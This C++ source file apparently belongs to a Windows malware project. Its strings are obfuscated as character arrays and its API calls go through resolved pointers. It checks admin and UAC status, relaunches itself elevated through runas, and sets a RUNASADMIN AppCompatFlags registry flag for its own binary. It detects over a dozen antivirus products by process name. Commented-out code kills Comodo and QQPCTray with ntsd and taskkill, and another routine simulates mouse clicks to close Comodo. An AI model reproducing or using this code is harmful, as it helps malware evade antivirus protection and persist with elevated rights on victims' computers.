#include <Windows.h>
#include "api.h"
#include "AntiVirus.h"
#include "public.h"
#include "log.h"

#include <lm.h>
#include "Utils.h"

#pragma comment( lib, "netapi32.lib" )


//DWORD NetQueryDisplayInformation( IN LPCWSTR ServerName OPTIONAL, IN DWORD Level, IN DWORD Index, IN DWORD EntriesRequested,
// IN DWORD PreferredMaximumLength, OUT LPDWORD ReturnedEntryCount, OUT PVOID *SortedBuffer );
BOOL IsUserAdminGroup()
{

	DWORD rc;
	wchar_t user_name[MAX_PATH];
	USER_INFO_1* info;
	DWORD size = MAX_PATH;

	GetUserNameW(user_name, &size);

	rc = NetUserGetInfo(NULL, user_name, 1, (byte**)&info);
	if (rc != NERR_Success)
		return false;

	BOOL result = info->usri1_priv == USER_PRIV_ADMIN;

	NetApiBufferFree(info);
	return result;
}







int GainAdminPrivileges(char* strApp, UINT idd)
{
	char         strCmd[MAX_PATH];
	char szAdminOptFormat[] = { '/','a','d','m','i','n','o','p','t','i','o','n',' ','%','d',0 };	//	"/adminoption %d"
	lpwsprintfA(strCmd, szAdminOptFormat, idd);
	char szRunAs[] = { 'r','u','n','a','s',0 };

	SHELLEXECUTEINFOA execinfo;
	memset(&execinfo, 0, sizeof(execinfo));
	execinfo.lpFile = strApp;
	execinfo.cbSize = sizeof(execinfo);
	execinfo.lpVerb = szRunAs;
	execinfo.fMask = SEE_MASK_NO_CONSOLE;
	execinfo.nShow = SW_SHOWDEFAULT;
	execinfo.lpParameters = strCmd;

	int iRet = lpShellExecuteExA(&execinfo);
	return iRet;
}



//equal set jobadd
int SetRunAsAdmin()
{
	unsigned char szQueryValue[MAX_PATH];
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = 0;
	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;

	//'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce',0
	//'Software\Microsoft\Windows\CurrentVersion\RunServices',0
	//'Software\Microsoft\Windows\CurrentVersion\RunOnce',0

	char szRunAsAdmin[] = { 'R','U','N','A','S','A','D','M','I','N',0 };
	//not "\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\\"
	char szSubkeyRunAs[MAX_PATH] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\',\
		'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','A','p','p','C','o','m','p','a','t','F','l','a','g','s','\\','L','a','y','e','r','s',0 };


	iRes = lpRegCreateKeyExA(HKEY_CURRENT_USER, szSubkeyRunAs, 0, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, 0, &hKey, &dwDisPos);
	if (iRes != ERROR_SUCCESS)
	{
		//char szError[1024];
		//FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,szError,iRes,0,szError,MAX_PATH,0);
		writeLog("SetRunAsAdmin lpRegCreateKeyExA error\r\n");
		return FALSE;
	}

	iRes = lpRegQueryValueExA(hKey, strPEResidence, 0, &iType, szQueryValue, &iQueryLen);
	if (iRes == ERROR_SUCCESS)
	{
		if (lpRtlCompareMemory((char*)szQueryValue, szRunAsAdmin, lplstrlenA(szRunAsAdmin)) == lplstrlenA(szRunAsAdmin))
		{
			lpRegCloseKey(hKey);
			writeLog("SetRunAsAdmin lpRegQueryValueExA ok,the key was existing\r\n");
			return TRUE;
		}
		else
		{
			writeLog("SetRunAsAdmin lpRegQueryValueExA value is not runasadmin\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}

		return TRUE;
	}
	else
	{
		iRes = lpRegSetValueExA(hKey, strPEResidence, 0, REG_SZ, (unsigned char*)szRunAsAdmin, lplstrlenA(szRunAsAdmin));
		if (iRes != ERROR_SUCCESS)
		{
			writeLog("SetRunAsAdmin lpRegSetValueExA error\r\n");
			lpRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			//RegFlushKey(hKey);
			writeLog("SetRunAsAdmin lpRegSetValueExA ok\r\n");
			lpRegCloseKey(hKey);
			return TRUE;
			//u can move it into setup folder
		}
	}

	return FALSE;
}



int IsUACEnable(int iCpuBits, int* iEnableLUA, int* iConsentPromptBehaviorAdmin, int* iPromptOnSecureDesktop)
{
	//"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\"
	char szUacSubKey[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',
		'\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','P','o','l','i','c','i','e','s','\\','S','y','s','t','e','m','\\',0 };

	//"PromptOnSecureDesktop"
	char szPromptOnSecureDesktop[] = { 'P','r','o','m','p','t','O','n','S','e','c','u','r','e','D','e','s','k','t','o','p',0 };
	//"ConsentPromptBehaviorAdmin"
	char szConsentPromptBehaviorAdmin[] = { 'C','o','n','s','e','n','t','P','r','o','m','p','t','B','e','h','a','v','i','o','r','A','d','m','i','n',0 };
	//"EnableLUA"
	char szEnableLUA[] = { 'E','n','a','b','l','e','L','U','A',0 };

	// window vista or windows server 2008 or later operating system
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		PVOID dwWow64Value;
		if (iCpuBits == 64)
		{
			pfnWow64DisableWow64FsRedirection(&dwWow64Value);
		}

		HKEY hKEY = NULL;
		DWORD dwType = REG_DWORD;
		DWORD dwSize = sizeof(DWORD);
		LONG status = lpRegOpenKeyExA(HKEY_LOCAL_MACHINE, szUacSubKey, 0, KEY_READ, &hKEY);
		if (iCpuBits == 64)
		{
			pfnWow64DisableWow64FsRedirection(&dwWow64Value);
		}
		if (ERROR_SUCCESS == status)
		{
			status = lpRegQueryValueExA(hKEY, szPromptOnSecureDesktop, NULL, &dwType, (BYTE*)iPromptOnSecureDesktop, &dwSize);
			if (ERROR_SUCCESS == status)
			{
				status = lpRegQueryValueExA(hKEY, szConsentPromptBehaviorAdmin, NULL, &dwType, (BYTE*)iConsentPromptBehaviorAdmin, &dwSize);
				if (ERROR_SUCCESS == status)
				{

				}
				else
				{
					lpRegCloseKey(hKEY);
					writeLog("IsUACEnable lpRegQueryValueExA error\r\n");
					return FALSE;
				}
			}
			else
			{
				lpRegCloseKey(hKEY);
				writeLog("IsUACEnable lpRegQueryValueExA error\r\n");
				return FALSE;
			}

			status = lpRegQueryValueExA(hKEY, szEnableLUA, NULL, &dwType, (BYTE*)iEnableLUA, &dwSize);
			if (ERROR_SUCCESS == status)
			{

			}
			else
			{
				writeLog("IsUACEnable lpRegQueryValueExA error\r\n");
				lpRegCloseKey(hKEY);
				return FALSE;
			}
#ifdef _DEBUG

			char szShowBuf[1024];
			lpwsprintfA(szShowBuf, "EnableLUA:%u,ConsentPromptBehaviorAdmin:%u,PromptOnSecureDesktop:%u\r\n",
				*iEnableLUA, *iConsentPromptBehaviorAdmin, *iPromptOnSecureDesktop);
			writeLog(szShowBuf);
#endif

			lpRegCloseKey(hKEY);
			return (*iConsentPromptBehaviorAdmin) | (*iPromptOnSecureDesktop);
		}
	}

	return FALSE;
}




BOOL IsAdministratorUser()
{
	char szshell32[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
	char szIsUserAnAdmain[] = { 'I','s','U','s','e','r','A','n','A','d','m','i','n',0 };
	typedef BOOL(__stdcall* FunctionIsUserAdmin)();
	HMODULE hm = lpLoadLibraryA(szshell32);
	FunctionIsUserAdmin pfnIsUserAnAdmin = (FunctionIsUserAdmin)lpGetProcAddress(hm, szIsUserAnAdmain);
	if (pfnIsUserAnAdmin)
	{
		int iRet = pfnIsUserAnAdmin();
		return iRet;
	}
	return FALSE;
}





BOOL IsAdminProcess(UINT PID)
{
	if (PID <= 0)
		PID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
	if (hProcess == NULL) {//要么没这个进程，要么也有可能是ADMIN权限无法打开
		return TRUE;
	}
	HANDLE hToken;
	DWORD dwAttributes;
	DWORD isAdmin(0);
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		SID_IDENTIFIER_AUTHORITY Authority = SECURITY_NT_AUTHORITY;

		PSID psidAdmin = NULL;
		if (AllocateAndInitializeSid(&Authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &psidAdmin))
		{
			DWORD dwCount = 0;
			GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwCount);
			dwCount = dwCount + 1024;
			TOKEN_GROUPS* pTokenGroups = (TOKEN_GROUPS*)new BYTE[dwCount];
			GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwCount, &dwCount);
			DWORD dwGroupCount = pTokenGroups->GroupCount;
			for (DWORD i = 0; i < dwGroupCount; i++)
			{
				if (EqualSid(psidAdmin, pTokenGroups->Groups[i].Sid))
				{
					dwAttributes = pTokenGroups->Groups[i].Attributes;
					isAdmin = (dwAttributes & SE_GROUP_USE_FOR_DENY_ONLY) != SE_GROUP_USE_FOR_DENY_ONLY;
					isAdmin = TRUE;
					break;
				}
			}
			delete[] pTokenGroups;
			FreeSid(psidAdmin);
		}
		CloseHandle(hToken);
	}
	CloseHandle(hProcess);
	return isAdmin;
}







BOOL IsAdministrator() //判断是否管理员模式
{
	BOOL bIsElevated = FALSE;
	HANDLE hToken = NULL;
	UINT16 uWinVer = LOWORD(GetVersion());
	uWinVer = MAKEWORD(HIBYTE(uWinVer), LOBYTE(uWinVer));

	if (uWinVer < 0x0600)//不是VISTA、Windows7
		return(FALSE);

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {

		struct {
			DWORD TokenIsElevated;
		} /*TOKEN_ELEVATION*/te;
		DWORD dwReturnLength = 0;

		if (GetTokenInformation(hToken,/*TokenElevation*/(_TOKEN_INFORMATION_CLASS)20, &te, sizeof(te), &dwReturnLength)) {
			if (dwReturnLength == sizeof(te))
				bIsElevated = te.TokenIsElevated;
		}
		CloseHandle(hToken);
	}
	return bIsElevated;
}

bool IsProcessRunAsAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;

	BOOL b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);

	if (b)
	{
		CheckTokenMembership(NULL, AdministratorsGroup, &b);
		FreeSid(AdministratorsGroup);
	}

	return b == TRUE;
}



/*
//178 217
// 134 232
// 189  287
// #define COMODO_ANTIVIRUS_WIDTH			178
// #define COMODO_ANTIVIRUS_HEIGHT			217
//#define COMODO_ANTIVIRUS_FOLDER_HEIGHT	92
//the right click menu size is irrelevent with screen resolution
#define COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT	232
#define COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH	136
int MouseEventToCloseComodo()
{
	HWND hwndComodo = lpFindWindowA("CisWidget","COMODO Internet Security Premium");
	RECT stRect = {0};
	if (hwndComodo)
	{
		int iRet = lpGetWindowRect(hwndComodo,&stRect);
		if (iRet == 0)
		{
			return FALSE;
		}

		int iIsFolder = 0;
		if (stRect.bottom - stRect.top < stRect.right - stRect.left)
		{
			iIsFolder = TRUE;
		}
		else
		{
			iIsFolder = FALSE;
		}
// 		int iComodoConsoleWidth = stRect.right - stRect.left;
// 		int iComodoConsoleHeight = stRect.bottom - stRect.top;

		char szScreenDCName[] = {'D','I','S','P','L','A','Y',0};
		HDC hdc = lpCreateDCA(szScreenDCName, NULL, NULL, NULL);
		int xScrn = lpGetDeviceCaps(hdc, HORZRES);
		int yScrn = lpGetDeviceCaps(hdc, VERTRES);
		lpDeleteDC(hdc);

		POINT stPtMid = {0};
		stPtMid.x = (stRect.left + stRect.right) >> 1;
		stPtMid.y = (stRect.bottom + stRect.top) >> 1;

		POINT stPtRightButtonClickMenu = {0};
		if (stPtMid.y < COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT)
		{
			stPtRightButtonClickMenu.y = COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_HEIGHT;
		}
		else
		{
			stPtRightButtonClickMenu.y = stPtMid.y;
		}

		if (stPtMid.x > xScrn - COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH)
		{
			stPtRightButtonClickMenu.x = xScrn - COMODO_CONTROL_CONSOLE_RIGHTBUTTON_MENU_WIDTH;
		}
		else
		{
			stPtRightButtonClickMenu.x = stPtMid.x;
		}

		iRet = SetCursorPos(stPtMid.x ,stPtMid.y);
		mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
		lpSleep(500);

// 		POINT stPtFirLeftClick = {0};
// 		stPtFirLeftClick.x = (stRect.left + stRect.right) >>1;
// 		stPtFirLeftClick.y = (stRect.bottom + 10);
// 		if (iIsFolder)
// 		{
// 			stPtFirLeftClick.y = stPtFirLeftClick.y + COMODO_ANTIVIRUS_HEIGHT - COMODO_ANTIVIRUS_FOLDER_HEIGHT;
// 		}
//		iRet = SetCursorPos(stPtFirLeftClick.x, stPtFirLeftClick.y);

		iRet = SetCursorPos(stPtRightButtonClickMenu.x + 30, stPtRightButtonClickMenu.y - 10);	//left bottom postion of right click menu
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

		lpSleep(500);
		iRet = SetCursorPos(745, 455);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		return TRUE;
	}

	return FALSE;
}
*/


//https://www.freebuf.com/articles/system/357165.html
int GetAntivirusSoft()
{
	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
	char sz360SecurityDefender[] = { '3','6','0','s','d','.','e','x','e',0 };
	char sz360RealtimeProtect[] = { '3','6','0','r','p','.','e','x','e',0 };

	char szAvguard[] = { 'A','V','G','U','A','R','D','.','E','X','E',0 };
	char szAvgnt[] = { 'A','V','G','N','T','.','E','X','E',0 };
	CHAR szAvcenter[] = { 'A','V','C','E','N','T','E','R','.','E','X','E',0 };

	char szQQ[] = { 'Q','Q','.','E','X','E',0 };

	char szAvastui[] = { 'a','v','a','s','t','u','i','.','e','x','e',0 };
	char szAswids[] = { 'a','s','w','i','d','s','a','g','e','n','t','.','e','x','e',0 };

	char szCistray[] = { 'c','i','s','t','r','a','y','.','e','x','e',0 };

	//char sz360RealtimeProtectService[] = {'3','6','0','r','p','s','.','e','x','e',0};

	char szrsmain[] = { 'r','s','m','a','i','n','.','e','x','e',0 };		//rsmain.exe rsagent.exe
	char szrsagent[] = { 'r','s','a','g','e','n','t','.','e','x','e',0 };	//KSafeTray.exe kxetray.exe
	char szKSafeTray[] = { 'K','S','a','f','e','T','r','a','y','.','e','x','e',0 };
	char szkxetray[] = { 'k','x','e','t','r','a','y','.','e','x','e',0 };
	char szns[] = { 'N','S','.','e','x','e',0 };	//NS.exe
	char szavpui[] = { 'a','v','p','u','i','.','e','x','e',0 };		//avpui
	char szavp[] = { 'a','v','p','.','e','x','e',0 };		//avp
	char szBaiduAnSvc[] = { 'B','a','i','d','u','A','n','S','v','c','.','e','x','e',0 };	//BaiduAnSvc
	char szBaidusdSvc[] = { 'B','a','i','d','u','s','d','S','v','c','.','e','x','e',0 };		//BaidusdSvc
	char szQQPCTray[] = { 'Q','Q','P','C','T','r','a','y','.','e','x','e',0 };		//QQPCTray

	char szMsMpEng[] = { 'M','s','M','p','E','n','g','.','e','x','e',0 };	//MsMpEng.exe

	//get all the process on the computer,include client user and admin user
	b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName(sz360SecurityDefender) | GetProcessIdByName(sz360RealtimeProtect)*/;

	bQQExist = GetProcessIdByName(szQQ);

	bAvgntRunning = GetProcessIdByName(szAvgnt) | GetProcessIdByName(szAvguard) | GetProcessIdByName(szAvcenter);

	bAvastRunning = GetProcessIdByName(szAvastui) | GetProcessIdByName(szAswids);

	bComodoRunning = GetProcessIdByName(szCistray);
	// 	if (bComodoExist)
	// 	{
	// 		lpGetSystemDirectoryA(szSysDir,MAX_PATH);
	// 		//int iRet = MouseEventToCloseComodo();
	// 		char szNtsdShutdown[MAX_PATH];
	// 		lpwsprintfA(szNtsdShutdown,"ntsd -c q -p %u",bComodoExist);
	// 		lpWinExec(szNtsdShutdown,SW_HIDE);	
	// 		lpwsprintfA(szNtsdShutdown,"TASKKILL /IM %s /F",szCistray);
	// 		lpWinExec(szNtsdShutdown,SW_HIDE);
	// 		//lpExitProcess(0);
	// 	}

	bRuixingRunning = GetProcessIdByName(szrsmain) | GetProcessIdByName(szrsagent);

	bJinshanRunning = GetProcessIdByName(szKSafeTray) | GetProcessIdByName(szkxetray);

	bNortonRunning = GetProcessIdByName(szns);

	bKasperskyRunning = GetProcessIdByName(szavpui) | GetProcessIdByName(szavp);

	bBaiduAntiRunning = GetProcessIdByName(szBaiduAnSvc) | GetProcessIdByName(szBaidusdSvc);

	bQQPCTrayRunning = GetProcessIdByName(szQQPCTray);

	bMsMpEng = GetProcessIdByName(szMsMpEng);
	// 	if (bQQPCTrayExist)
	// 	{
	// 		char szNtsdShutdown[MAX_PATH];
	// 		lpwsprintfA(szNtsdShutdown,"ntsd -c q -p %u",bQQPCTrayExist);
	// 		lpWinExec(szNtsdShutdown,SW_HIDE);
	// 		lpwsprintfA(szNtsdShutdown,"TASKKILL /IM QQPCTray.exe /F");
	// 		lpWinExec(szNtsdShutdown,SW_HIDE);
	// 	}

	return TRUE;
}



